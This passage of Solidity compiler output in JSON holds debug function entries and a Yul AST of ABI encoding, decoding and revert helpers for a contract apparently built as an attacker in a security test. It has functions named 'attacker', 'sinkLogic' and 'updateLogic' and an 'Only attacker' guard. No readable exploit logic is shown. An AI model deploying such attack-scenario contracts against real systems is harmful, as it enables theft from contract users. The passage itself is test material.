									"returnSlots": 0
								},
								"@_49": {
									"entryPoint": null,
									"id": 49,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@attacker_6": {
									"entryPoint": 218,
									"id": 6,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@sinkLogic_4": {
									"entryPoint": 464,
									"id": 4,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@updateLogic_45": {
									"entryPoint": 255,
									"id": 45,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"abi_decode_t_address": {
									"entryPoint": 613,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_address": {
									"entryPoint": 633,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_address_to_t_address_fromStack": {
									"entryPoint": 547,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_t_stringliteral_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43_to_t_string_memory_ptr_fromStack": {
									"entryPoint": 732,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_address__to_t_address__fromStack_reversed": {
									"entryPoint": 562,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_stringliteral_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43__to_t_string_memory_ptr__fromStack_reversed": {
									"entryPoint": 766,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_string_memory_ptr_fromStack": {
									"entryPoint": 676,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 530,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 499,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 587,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"store_literal_in_memory_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43": {
									"entryPoint": 692,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 591,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:2666:1",
										"nodeType": "YulBlock",
										"src": "0:2666:1",
										"statements": [
											{
												"body": {
													"nativeSrc": "52:81:1",
													"nodeType": "YulBlock",
													"src": "52:81:1",
													"statements": [
														{
															"nativeSrc": "62:65:1",
															"nodeType": "YulAssignment",
															"src": "62:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "77:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "77:5:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "84:42:1",
																		"nodeType": "YulLiteral",
																		"src": "84:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nativeSrc": "73:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "73:3:1"
																},
																"nativeSrc": "73:54:1",
																"nodeType": "YulFunctionCall",
																"src": "73:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "62:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "62:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nativeSrc": "7:126:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "34:5:1",
														"nodeType": "YulTypedName",
														"src": "34:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "44:7:1",
														"nodeType": "YulTypedName",
														"src": "44:7:1",
														"type": ""
													}
												],
												"src": "7:126:1"
											},
											{
												"body": {
													"nativeSrc": "184:51:1",
													"nodeType": "YulBlock",
													"src": "184:51:1",
													"statements": [
														{
															"nativeSrc": "194:35:1",
															"nodeType": "YulAssignment",
															"src": "194:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "223:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "223:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nativeSrc": "205:17:1",
																	"nodeType": "YulIdentifier",
																	"src": "205:17:1"
																},
																"nativeSrc": "205:24:1",
																"nodeType": "YulFunctionCall",
																"src": "205:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "194:7:1",
																	"nodeType": "YulIdentifier",
																	"src": "194:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nativeSrc": "139:96:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "166:5:1",
														"nodeType": "YulTypedName",
														"src": "166:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "176:7:1",
														"nodeType": "YulTypedName",
														"src": "176:7:1",
														"type": ""
													}
												],
												"src": "139:96:1"
											},
											{
												"body": {
													"nativeSrc": "306:53:1",
													"nodeType": "YulBlock",
													"src": "306:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "323:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "323:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "346:5:1",
																				"nodeType": "YulIdentifier",
																				"src": "346:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nativeSrc": "328:17:1",
																			"nodeType": "YulIdentifier",
																			"src": "328:17:1"
																		},
																		"nativeSrc": "328:24:1",
																		"nodeType": "YulFunctionCall",
																		"src": "328:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "316:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "316:6:1"
																},
																"nativeSrc": "316:37:1",
																"nodeType": "YulFunctionCall",
																"src": "316:37:1"
															},
															"nativeSrc": "316:37:1",
															"nodeType": "YulExpressionStatement",
															"src": "316:37:1"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nativeSrc": "241:118:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "294:5:1",
														"nodeType": "YulTypedName",
														"src": "294:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nativeSrc": "301:3:1",
														"nodeType": "YulTypedName",
														"src": "301:3:1",
														"type": ""
													}
												],
												"src": "241:118:1"
											},
											{
												"body": {
													"nativeSrc": "463:124:1",
													"nodeType": "YulBlock",
													"src": "463:124:1",
													"statements": [
														{
															"nativeSrc": "473:26:1",
															"nodeType": "YulAssignment",
															"src": "473:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "485:9:1",
																		"nodeType": "YulIdentifier",
																		"src": "485:9:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "496:2:1",
																		"nodeType": "YulLiteral",
																		"src": "496:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "481:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "481:3:1"
																},
																"nativeSrc": "481:18:1",
																"nodeType": "YulFunctionCall",
																"src": "481:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nativeSrc": "473:4:1",
																	"nodeType": "YulIdentifier",
																	"src": "473:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nativeSrc": "553:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "553:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nativeSrc": "566:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "566:9:1"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "577:1:1",
																				"nodeType": "YulLiteral",
																				"src": "577:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "562:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "562:3:1"
																		},
																		"nativeSrc": "562:17:1",
																		"nodeType": "YulFunctionCall",
																		"src": "562:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nativeSrc": "509:43:1",
																	"nodeType": "YulIdentifier",
																	"src": "509:43:1"
																},
																"nativeSrc": "509:71:1",
																"nodeType": "YulFunctionCall",
																"src": "509:71:1"
															},
															"nativeSrc": "509:71:1",
															"nodeType": "YulExpressionStatement",
															"src": "509:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nativeSrc": "365:222:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "435:9:1",
														"nodeType": "YulTypedName",
														"src": "435:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nativeSrc": "447:6:1",
														"nodeType": "YulTypedName",
														"src": "447:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nativeSrc": "458:4:1",
														"nodeType": "YulTypedName",
														"src": "458:4:1",
														"type": ""
													}
												],
												"src": "365:222:1"
											},
											{
												"body": {
													"nativeSrc": "633:35:1",
													"nodeType": "YulBlock",
													"src": "633:35:1",
													"statements": [
														{
															"nativeSrc": "643:19:1",
															"nodeType": "YulAssignment",
															"src": "643:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "659:2:1",
																		"nodeType": "YulLiteral",
																		"src": "659:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nativeSrc": "653:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "653:5:1"
																},
																"nativeSrc": "653:9:1",
																"nodeType": "YulFunctionCall",
																"src": "653:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nativeSrc": "643:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "643:6:1"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nativeSrc": "593:75:1",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nativeSrc": "626:6:1",
														"nodeType": "YulTypedName",
														"src": "626:6:1",
														"type": ""
													}
												],
												"src": "593:75:1"
											},
											{
												"body": {
													"nativeSrc": "763:28:1",
													"nodeType": "YulBlock",
													"src": "763:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "780:1:1",
																		"nodeType": "YulLiteral",
																		"src": "780:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "783:1:1",
																		"nodeType": "YulLiteral",
																		"src": "783:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "773:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "773:6:1"
																},
																"nativeSrc": "773:12:1",
																"nodeType": "YulFunctionCall",
																"src": "773:12:1"
															},
															"nativeSrc": "773:12:1",
															"nodeType": "YulExpressionStatement",
															"src": "773:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nativeSrc": "674:117:1",
												"nodeType": "YulFunctionDefinition",
												"src": "674:117:1"
											},
											{
												"body": {
													"nativeSrc": "886:28:1",
													"nodeType": "YulBlock",
													"src": "886:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "903:1:1",
																		"nodeType": "YulLiteral",
																		"src": "903:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "906:1:1",
																		"nodeType": "YulLiteral",
																		"src": "906:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "896:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "896:6:1"
																},
																"nativeSrc": "896:12:1",
																"nodeType": "YulFunctionCall",
																"src": "896:12:1"
															},
															"nativeSrc": "896:12:1",
															"nodeType": "YulExpressionStatement",
															"src": "896:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nativeSrc": "797:117:1",
												"nodeType": "YulFunctionDefinition",
												"src": "797:117:1"
											},
											{
												"body": {
													"nativeSrc": "963:79:1",
													"nodeType": "YulBlock",
													"src": "963:79:1",
													"statements": [
														{
															"body": {
																"nativeSrc": "1020:16:1",
																"nodeType": "YulBlock",
																"src": "1020:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nativeSrc": "1029:1:1",
																					"nodeType": "YulLiteral",
																					"src": "1029:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nativeSrc": "1032:1:1",
																					"nodeType": "YulLiteral",
																					"src": "1032:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nativeSrc": "1022:6:1",
																				"nodeType": "YulIdentifier",
																				"src": "1022:6:1"
																			},
																			"nativeSrc": "1022:12:1",
																			"nodeType": "YulFunctionCall",
																			"src": "1022:12:1"
																		},
																		"nativeSrc": "1022:12:1",
																		"nodeType": "YulExpressionStatement",
																		"src": "1022:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "986:5:1",
																				"nodeType": "YulIdentifier",
																				"src": "986:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nativeSrc": "1011:5:1",
																						"nodeType": "YulIdentifier",
																						"src": "1011:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nativeSrc": "993:17:1",
																					"nodeType": "YulIdentifier",
																					"src": "993:17:1"
																				},
																				"nativeSrc": "993:24:1",
																				"nodeType": "YulFunctionCall",
																				"src": "993:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nativeSrc": "983:2:1",
																			"nodeType": "YulIdentifier",
																			"src": "983:2:1"
																		},
																		"nativeSrc": "983:35:1",
																		"nodeType": "YulFunctionCall",
																		"src": "983:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "976:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "976:6:1"
																},
																"nativeSrc": "976:43:1",
																"nodeType": "YulFunctionCall",
																"src": "976:43:1"
															},
															"nativeSrc": "973:63:1",
															"nodeType": "YulIf",
															"src": "973:63:1"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nativeSrc": "920:122:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "956:5:1",
														"nodeType": "YulTypedName",
														"src": "956:5:1",
														"type": ""
													}
												],
												"src": "920:122:1"
											},
											{
												"body": {
													"nativeSrc": "1100:87:1",
													"nodeType": "YulBlock",
													"src": "1100:87:1",
													"statements": [
														{
															"nativeSrc": "1110:29:1",
															"nodeType": "YulAssignment",
															"src": "1110:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nativeSrc": "1132:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "1132:6:1"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nativeSrc": "1119:12:1",
																	"nodeType": "YulIdentifier",
																	"src": "1119:12:1"
																},
																"nativeSrc": "1119:20:1",
																"nodeType": "YulFunctionCall",
																"src": "1119:20:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nativeSrc": "1110:5:1",
																	"nodeType": "YulIdentifier",
																	"src": "1110:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nativeSrc": "1175:5:1",
																		"nodeType": "YulIdentifier",
																		"src": "1175:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nativeSrc": "1148:26:1",
																	"nodeType": "YulIdentifier",
																	"src": "1148:26:1"
																},
																"nativeSrc": "1148:33:1",
																"nodeType": "YulFunctionCall",
																"src": "1148:33:1"
															},
															"nativeSrc": "1148:33:1",
															"nodeType": "YulExpressionStatement",
															"src": "1148:33:1"
														}
													]
												},
												"name": "abi_decode_t_address",
												"nativeSrc": "1048:139:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nativeSrc": "1078:6:1",
														"nodeType": "YulTypedName",
														"src": "1078:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nativeSrc": "1086:3:1",
														"nodeType": "YulTypedName",
														"src": "1086:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nativeSrc": "1094:5:1",
														"nodeType": "YulTypedName",
														"src": "1094:5:1",
														"type": ""
													}
												],
												"src": "1048:139:1"
											},
											{
												"body": {
													"nativeSrc": "1259:263:1",
													"nodeType": "YulBlock",
													"src": "1259:263:1",
													"statements": [
														{
															"body": {
																"nativeSrc": "1305:83:1",
																"nodeType": "YulBlock",
																"src": "1305:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nativeSrc": "1307:77:1",
																				"nodeType": "YulIdentifier",
																				"src": "1307:77:1"
																			},
																			"nativeSrc": "1307:79:1",
																			"nodeType": "YulFunctionCall",
																			"src": "1307:79:1"
																		},
																		"nativeSrc": "1307:79:1",
																		"nodeType": "YulExpressionStatement",
																		"src": "1307:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1280:7:1",
																				"nodeType": "YulIdentifier",
																				"src": "1280:7:1"
																			},
																			{
																				"name": "headStart",
																				"nativeSrc": "1289:9:1",
																				"nodeType": "YulIdentifier",
																				"src": "1289:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nativeSrc": "1276:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "1276:3:1"
																		},
																		"nativeSrc": "1276:23:1",
																		"nodeType": "YulFunctionCall",
																		"src": "1276:23:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1301:2:1",
																		"nodeType": "YulLiteral",
																		"src": "1301:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nativeSrc": "1272:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "1272:3:1"
																},
																"nativeSrc": "1272:32:1",
																"nodeType": "YulFunctionCall",
																"src": "1272:32:1"
															},
															"nativeSrc": "1269:119:1",
															"nodeType": "YulIf",
															"src": "1269:119:1"
														},
														{
															"nativeSrc": "1398:117:1",
															"nodeType": "YulBlock",
															"src": "1398:117:1",
															"statements": [
																{
																	"nativeSrc": "1413:15:1",
																	"nodeType": "YulVariableDeclaration",
																	"src": "1413:15:1",
																	"value": {
																		"kind": "number",
																		"nativeSrc": "1427:1:1",
																		"nodeType": "YulLiteral",
																		"src": "1427:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nativeSrc": "1417:6:1",
																			"nodeType": "YulTypedName",
																			"src": "1417:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nativeSrc": "1442:63:1",
																	"nodeType": "YulAssignment",
																	"src": "1442:63:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nativeSrc": "1477:9:1",
																						"nodeType": "YulIdentifier",
																						"src": "1477:9:1"
																					},
																					{
																						"name": "offset",
																						"nativeSrc": "1488:6:1",
																						"nodeType": "YulIdentifier",
																						"src": "1488:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nativeSrc": "1473:3:1",
																					"nodeType": "YulIdentifier",
																					"src": "1473:3:1"
																				},
																				"nativeSrc": "1473:22:1",
																				"nodeType": "YulFunctionCall",
																				"src": "1473:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nativeSrc": "1497:7:1",
																				"nodeType": "YulIdentifier",
																				"src": "1497:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address",
																			"nativeSrc": "1452:20:1",
																			"nodeType": "YulIdentifier",
																			"src": "1452:20:1"
																		},
																		"nativeSrc": "1452:53:1",
																		"nodeType": "YulFunctionCall",
																		"src": "1452:53:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nativeSrc": "1442:6:1",
																			"nodeType": "YulIdentifier",
																			"src": "1442:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address",
												"nativeSrc": "1193:329:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nativeSrc": "1229:9:1",
														"nodeType": "YulTypedName",
														"src": "1229:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nativeSrc": "1240:7:1",
														"nodeType": "YulTypedName",
														"src": "1240:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nativeSrc": "1252:6:1",
														"nodeType": "YulTypedName",
														"src": "1252:6:1",
														"type": ""
													}
												],
												"src": "1193:329:1"
											},
											{
												"body": {
													"nativeSrc": "1624:73:1",
													"nodeType": "YulBlock",
													"src": "1624:73:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "1641:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "1641:3:1"
																	},
																	{
																		"name": "length",
																		"nativeSrc": "1646:6:1",
																		"nodeType": "YulIdentifier",
																		"src": "1646:6:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1634:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "1634:6:1"
																},
																"nativeSrc": "1634:19:1",
																"nodeType": "YulFunctionCall",
																"src": "1634:19:1"
															},
															"nativeSrc": "1634:19:1",
															"nodeType": "YulExpressionStatement",
															"src": "1634:19:1"
														},
														{
															"nativeSrc": "1662:29:1",
															"nodeType": "YulAssignment",
															"src": "1662:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "1681:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "1681:3:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "1686:4:1",
																		"nodeType": "YulLiteral",
																		"src": "1686:4:1",
																		"type": "",
																		"value": "0x20"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "1677:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "1677:3:1"
																},
																"nativeSrc": "1677:14:1",
																"nodeType": "YulFunctionCall",
																"src": "1677:14:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nativeSrc": "1662:11:1",
																	"nodeType": "YulIdentifier",
																	"src": "1662:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
												"nativeSrc": "1528:169:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nativeSrc": "1596:3:1",
														"nodeType": "YulTypedName",
														"src": "1596:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nativeSrc": "1601:6:1",
														"nodeType": "YulTypedName",
														"src": "1601:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nativeSrc": "1612:11:1",
														"nodeType": "YulTypedName",
														"src": "1612:11:1",
														"type": ""
													}
												],
												"src": "1528:169:1"
											},
											{
												"body": {
													"nativeSrc": "1809:57:1",
													"nodeType": "YulBlock",
													"src": "1809:57:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "memPtr",
																				"nativeSrc": "1831:6:1",
																				"nodeType": "YulIdentifier",
																				"src": "1831:6:1"
																			},
																			{
																				"kind": "number",
																				"nativeSrc": "1839:1:1",
																				"nodeType": "YulLiteral",
																				"src": "1839:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nativeSrc": "1827:3:1",
																			"nodeType": "YulIdentifier",
																			"src": "1827:3:1"
																		},
																		"nativeSrc": "1827:14:1",
																		"nodeType": "YulFunctionCall",
																		"src": "1827:14:1"
																	},
																	{
																		"hexValue": "4f6e6c792061747461636b6572",
																		"kind": "string",
																		"nativeSrc": "1843:15:1",
																		"nodeType": "YulLiteral",
																		"src": "1843:15:1",
																		"type": "",
																		"value": "Only attacker"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "1820:6:1",
																	"nodeType": "YulIdentifier",
																	"src": "1820:6:1"
																},
																"nativeSrc": "1820:39:1",
																"nodeType": "YulFunctionCall",
																"src": "1820:39:1"
															},
															"nativeSrc": "1820:39:1",
															"nodeType": "YulExpressionStatement",
															"src": "1820:39:1"
														}
													]
												},
												"name": "store_literal_in_memory_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43",
												"nativeSrc": "1703:163:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "memPtr",
														"nativeSrc": "1801:6:1",
														"nodeType": "YulTypedName",
														"src": "1801:6:1",
														"type": ""
													}
												],
												"src": "1703:163:1"
											},
											{
												"body": {
													"nativeSrc": "2018:220:1",
													"nodeType": "YulBlock",
													"src": "2018:220:1",
													"statements": [
														{
															"nativeSrc": "2028:74:1",
															"nodeType": "YulAssignment",
															"src": "2028:74:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "2094:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "2094:3:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2099:2:1",
																		"nodeType": "YulLiteral",
																		"src": "2099:2:1",
																		"type": "",
																		"value": "13"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_string_memory_ptr_fromStack",
																	"nativeSrc": "2035:58:1",
																	"nodeType": "YulIdentifier",
																	"src": "2035:58:1"
																},
																"nativeSrc": "2035:67:1",
																"nodeType": "YulFunctionCall",
																"src": "2035:67:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nativeSrc": "2028:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "2028:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "2200:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "2200:3:1"
																	}
																],
																"functionName": {
																	"name": "store_literal_in_memory_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43",
																	"nativeSrc": "2111:88:1",
																	"nodeType": "YulIdentifier",
																	"src": "2111:88:1"
																},
																"nativeSrc": "2111:93:1",
																"nodeType": "YulFunctionCall",
																"src": "2111:93:1"
															},
															"nativeSrc": "2111:93:1",
															"nodeType": "YulExpressionStatement",
															"src": "2111:93:1"
														},
														{
															"nativeSrc": "2213:19:1",
															"nodeType": "YulAssignment",
															"src": "2213:19:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "2224:3:1",
																		"nodeType": "YulIdentifier",
																		"src": "2224:3:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2229:2:1",
																		"nodeType": "YulLiteral",
																		"src": "2229:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "2220:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "2220:3:1"
																},
																"nativeSrc": "2220:12:1",
																"nodeType": "YulFunctionCall",
																"src": "2220:12:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nativeSrc": "2213:3:1",
																	"nodeType": "YulIdentifier",
																	"src": "2213:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_stringliteral_b0bd88688540afe6564b3feb4dbb0714be044707a3dd90e07b2b4bc989a44a43_to_t_string_memory_ptr_fromStack",
												"nativeSrc": "1872:366:1",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nativeSrc": "2006:3:1",
														"nodeType": "YulTypedName",
														"src": "2006:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nativeSrc": "2014:3:1",
														"nodeType": "YulTypedName",
														"src": "2014:3:1",
														"type": ""
													}
												],
												"src": "1872:366:1"
											},
											{
												"body": {
													"nativeSrc": "2415:248:1",
													"nodeType": "YulBlock",
													"src": "2415:248:1",
													"statements": [
														{
															"nativeSrc": "2425:26:1",
															"nodeType": "YulAssignment",
															"src": "2425:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nativeSrc": "2437:9:1",
																		"nodeType": "YulIdentifier",
																		"src": "2437:9:1"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "2448:2:1",
																		"nodeType": "YulLiteral",
																		"src": "2448:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nativeSrc": "2433:3:1",
																	"nodeType": "YulIdentifier",
